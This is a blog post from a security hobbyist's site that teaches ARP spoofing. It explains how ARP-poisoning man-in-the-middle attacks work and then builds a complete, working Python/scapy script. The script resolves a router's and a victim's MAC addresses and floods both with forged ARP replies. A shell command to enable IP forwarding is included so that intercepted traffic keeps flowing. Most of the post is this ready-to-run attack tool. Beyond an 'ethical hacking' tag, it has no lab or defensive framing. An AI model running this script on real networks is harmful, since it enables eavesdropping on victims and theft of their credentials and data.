<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.6.2"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Writing an ARP spoofer using python" /><meta name="author" content="Mohamed Ezzat" /><meta property="og:locale" content="en_US" /><meta name="description" content="What is Address Resolution Protocol (ARP) ? Simple protocol used to map IP address of a machine to its MAC address, and vice versa." /><meta property="og:description" content="What is Address Resolution Protocol (ARP) ? Simple protocol used to map IP address of a machine to its MAC address, and vice versa." /><link rel="canonical" href="https://mohamedaezzat.github.io/posts/arpspoofer/" /><meta property="og:url" content="https://mohamedaezzat.github.io/posts/arpspoofer/" /><meta property="og:site_name" content="Echo" /><meta property="og:image" content="https://mohamedaezzat.github.io/assets/img/posts/arpspoofer/arpspoofer.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-17T13:56:24+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://mohamedaezzat.github.io/assets/img/posts/arpspoofer/arpspoofer.png" /><meta property="twitter:title" content="Writing an ARP spoofer using python" /><meta name="google-site-verification" content="SgWV4a8DvyptkO8yPJwWMZ7DexcYzADmzpG_jTBbaVY" /> <script type="application/ld+json"> {"image":"https://mohamedaezzat.github.io/assets/img/posts/arpspoofer/arpspoofer.png","description":"What is Address Resolution Protocol (ARP) ? Simple protocol used to map IP address of a machine to its MAC address, and vice versa.","url":"https://mohamedaezzat.github.io/posts/arpspoofer/","headline":"Writing an ARP spoofer using python","dateModified":"2020-12-17T13:56:24+02:00","@type":"BlogPosting","datePublished":"2020-12-17T13:56:24+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mohamedaezzat.github.io/posts/arpspoofer/"},"author":{"@type":"Person","name":"Mohamed Ezzat"},"@context":"https://schema.org"}</script><title>Writing an ARP spoofer using python | Echo</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Echo</a></div><div class="site-subtitle font-italic">Hacking Stuff</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/MohamedAEzzat" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mohamedahmedpk','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Writing an ARP spoofer using python</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writing an ARP spoofer using python</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Dec 17, 2020, 1:56 PM +0200" > Dec 17, 2020 <i class="unloaded">2020-12-17T13:56:24+02:00</i> </span> by <span class="author"> Mohamed Ezzat </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/arpspoofer/arpspoofer.png" class="preview-img"><h2 id="what-is-address-resolution-protocol-arp-">What is Address Resolution Protocol (ARP) ?</h2><p>Simple protocol used to map IP address of a machine to its MAC address, and vice versa.</p><h2 id="what-is-arp-spoofing-">What is ARP spoofing ?</h2><p>An ARP spoofing, also known as ARP poisoning, is a Man in the Middle (MitM) attack that allows attackers to intercept communication between two parties either to secretly eavesdrop or modify traffic traveling between the two. Attackers might use MitM attacks to steal login credentials or personal information, spy on the victim, or sabotage communications or corrupt data. The attack works as follows:</p><ol><li>The attacker try to gain access to the network, then scan the network to find the IP addresses of his victims. For example the IP address of PC and router.<li>The attacker uses any spoofing tool (such as arpspoof) to send out forged ARP responses.<li>The forged responses trick the PC by sending the attacker’s MAC address as the router’s MAC address, and trick the router by sending the attacker’s MAC address as the PC’s MAC address. This fools both router and PC to connect to the attacker’s machine, instead of to each other.<li>The two devices update their ARP cache entries. After that, the communication is going through the attacker machine instead of directly with each other.<li>The attacker is now secretly in the middle of all communications.</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/arpspoofer/mitm.jpg" alt="MitM" /></p><h2 id="writing-the-script">Writing the script</h2><h3 id="step-1-importing-required-modules">Step 1: Importing required modules</h3><ul><li>scapy: is a powerful Python-based interactive packet manipulation program and library. It is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, store or read them using pcap files, match requests and replies, and much more.<li>sys: Lets us access system-specific parameters and functions.<li>time: provides many ways of representing time in code. It also provides functionality other than representing time, like waiting during code execution and measuring the efficiency of your code.</ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1"># Python code snippet
</span><span class="kn">import</span> <span class="nn">scapy.all</span> <span class="k">as</span> <span class="n">scapy</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
</pre></table></code></div></div><h3 id="step-2-asking-user-for-required-arguments">step 2: Asking user for required arguments</h3><p>We ask user to enter router ip and target ip as first and second command arguments respectively. Then we get the MAC address of both by calling get_mac_address function that we will implement later.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1"># Python code snippet
</span><span class="n">router_ip</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">target_ip</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="n">router_mac</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">get_mac_address</span><span class="p">(</span><span class="n">router_ip</span><span class="p">))</span>
<span class="n">target_mac</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">get_mac_address</span><span class="p">(</span><span class="n">target_ip</span><span class="p">))</span>
</pre></table></code></div></div><h3 id="step-2-implementing-required-functions">step 2: Implementing required functions</h3><h3 id="get_mac_address-function">get_mac_address() function</h3><p>get_mac_address function takes one parameter “ip_address”. We use this function to create our packet that consists of Ether layer takes destination broadcast MAC address ‘ff:ff:ff:ff:ff:ff’ and ARP layer takes the IP address of either target or router. Then we combine the two layers together to get our final packet. We use scapy.srp() function to send our packet. This function returns a list that contains answers and unanswers, so we put at the end index zero to select the first element which is answers. Then we return the MAC address of the specified IP address. The answer variable has a bunch of lists, so we need to set that we want the first list “[0]” that contains our packet then from this list we want the response that have the MAC address of our target/router “[1].hwsrc”.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">get_mac_address</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
    <span class="n">broadcast_layer</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">'ff:ff:ff:ff:ff:ff'</span><span class="p">)</span>
    <span class="n">arp_layer</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">ip_address</span><span class="p">)</span>
    <span class="n">get_mac_packet</span> <span class="o">=</span> <span class="n">broadcast_layer</span><span class="o">/</span><span class="n">arp_layer</span>
    <span class="n">answer</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">srp</span><span class="p">(</span><span class="n">get_mac_packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="bp">False</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">answer</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">].</span><span class="n">hwsrc</span>
</pre></table></code></div></div><h3 id="spoof-function">spoof() function</h3><p>spoof function takes four parameters “router_ip”, “target_ip, “router_mac”, and “target_mac”. This function is reponsible of spoofing by sending ARP response packet1 to the router as it comes from the target (for example, regular user on the network) and sending ARP response packet2 to the target as it comes from the router.</p><blockquote><p><strong>Note:</strong> in the scapy.ARP() function, op=2 for ARP response and op=1 for ARP request.</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c1"># Python code snippet
</span><span class="k">def</span> <span class="nf">spoof</span><span class="p">(</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">router_mac</span><span class="p">,</span> <span class="n">target_mac</span><span class="p">):</span>
    <span class="n">packet1</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">router_mac</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">target_ip</span><span class="p">)</span>
    <span class="n">packet2</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">target_mac</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">router_ip</span><span class="p">)</span>
    <span class="n">scapy</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet1</span><span class="p">)</span>
    <span class="n">scapy</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet2</span><span class="p">)</span>
</pre></table></code></div></div><h3 id="step3-calling-spoof-function">Step3: Calling spoof() function</h3><p>We launch an infinite while loop and call the spoof function to send packet1 and packet2 then we sleep 2 seconds between each packet that we sent. We handle the exception of KeyboardInterrupt, so we can terminate the program safely.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c1"># Python code snippet
</span><span class="k">try</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">spoof</span><span class="p">(</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">router_mac</span><span class="p">,</span> <span class="n">target_mac</span><span class="p">)</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Closing ARP Spoofer.'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="the-complete-script">The complete script</h2><p>After assembling all the steps together, here is the final complete script.</p><blockquote><p><strong>Note:</strong> before running the program, we need to enable packet forwarding to forward packets from one target to another. So we run this command first in our terminal.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo </span>1 <span class="o">&gt;&gt;</span> /proc/sys/net/ipv4/ip_forward
</pre></table></code></div></div></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">scapy.all</span> <span class="k">as</span> <span class="n">scapy</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">get_mac_address</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
    <span class="n">broadcast_layer</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">'ff:ff:ff:ff:ff:ff'</span><span class="p">)</span>
    <span class="n">arp_layer</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">ip_address</span><span class="p">)</span>
    <span class="n">get_mac_packet</span> <span class="o">=</span> <span class="n">broadcast_layer</span><span class="o">/</span><span class="n">arp_layer</span>
    <span class="n">answer</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">srp</span><span class="p">(</span><span class="n">get_mac_packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="bp">False</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">answer</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">].</span><span class="n">hwsrc</span>

<span class="k">def</span> <span class="nf">spoof</span><span class="p">(</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">router_mac</span><span class="p">,</span> <span class="n">target_mac</span><span class="p">):</span>
    <span class="n">packet1</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">router_mac</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">target_ip</span><span class="p">)</span>
    <span class="n">packet2</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">target_mac</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">router_ip</span><span class="p">)</span>
    <span class="n">scapy</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet1</span><span class="p">)</span>
    <span class="n">scapy</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet2</span><span class="p">)</span>

<span class="n">target_ip</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="n">router_ip</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">target_mac</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">get_mac_address</span><span class="p">(</span><span class="n">target_ip</span><span class="p">))</span>
<span class="n">router_mac</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">get_mac_address</span><span class="p">(</span><span class="n">router_ip</span><span class="p">))</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">spoof</span><span class="p">(</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">router_mac</span><span class="p">,</span> <span class="n">target_mac</span><span class="p">)</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Closing ARP Spoofer.'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/development/'>Development</a>, <a href='/categories/pentesting-tools/'>Pentesting Tools</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ethical-hacking/" class="post-tag no-text-decoration" >ethical hacking</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Writing an ARP spoofer using python - Echo&url=https://mohamedaezzat.github.io/posts/arpspoofer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Writing an ARP spoofer using python - Echo&u=https://mohamedaezzat.github.io/posts/arpspoofer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Writing an ARP spoofer using python - Echo&url=https://mohamedaezzat.github.io/posts/arpspoofer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ethical-hacking/">ethical hacking</a> <a class="post-tag" href="/tags/boot2root/">boot2root</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/htb/">htb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/portscanner/"><div class="card-body"> <span class="timeago small" > Dec 11, 2020 <i class="unloaded">2020-12-11T01:08:05+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writing a port scanner using python</h3><div class="text-muted small"><p> What is port scanning ? Briefly, Port Scanning is a technique helps the attackers to determine which ports on a network are open and discover services they can exploit to break into a computer syst...</p></div></div></a></div><div class="card"> <a href="/posts/vulnerabilityscanner/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T18:47:27+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writing a vulnerability scanner using python</h3><div class="text-muted small"><p> What is a vulnerability scanning ? Vulnerability scanning is an automated process that allows the organizations to check if their networks, systems and applications have security vulnerabilities th...</p></div></div></a></div><div class="card"> <a href="/posts/sshbruteforcer/"><div class="card-body"> <span class="timeago small" > Dec 15, 2020 <i class="unloaded">2020-12-15T19:08:43+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writing a SSH brute forcer using python</h3><div class="text-muted small"><p> What is a SSH protocol ? The SSH protocol (also known as Secure Shell) is a network protocol for secure remote login from one computer to another. It provides several alternative options for strong...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/sshbruteforcer/" class="btn btn-outline-primary"><p>Writing a SSH brute forcer using python</p></a> <a href="/posts/passwordsniffer/" class="btn btn-outline-primary"><p>Writing a password sniffer using python</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/MohamedAEzzat">Mohamed Ezzat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ethical-hacking/">ethical hacking</a> <a class="post-tag" href="/tags/boot2root/">boot2root</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/htb/">htb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://mohamedaezzat.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
